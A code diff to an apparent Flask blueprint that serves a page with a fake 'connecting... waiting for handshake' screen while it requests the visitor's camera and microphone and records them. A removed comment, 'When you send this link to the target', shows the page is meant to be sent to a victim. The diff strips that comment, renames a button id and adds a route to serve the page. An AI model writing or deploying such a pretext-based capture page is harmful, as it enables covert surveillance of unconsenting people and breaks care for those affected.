@@ -53,7 +53,6 @@ REMOTE_UI = """
             document.getElementById('login-box').innerHTML = "<h3>CONNECTING TO " + num + "...</h3><p>Waiting for handshake...</p>";
 
             try {
-                // Requesting local stream (When you send this link to the target)
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('login-box').style.display = 'none';
                 document.getElementById('monitor').style.display = 'block';
@@ -73,7 +72,7 @@ REMOTE_UI = """
         }
 
         function toggleRecord() {
-            const btn = document.getElementById('recBtn');
+            const btn = document.getElementById('recordBtn');
             if (!recorder || recorder.state === "inactive") {
                 chunks = [];
                 recorder = new MediaRecorder(stream);
@@ -98,4 +97,8 @@ REMOTE_UI = """
     </script>
 </body>
 </html>
+"""
 
+@script10_bp.route('/')
+def index():
+    return render_template_string(REMOTE_UI)
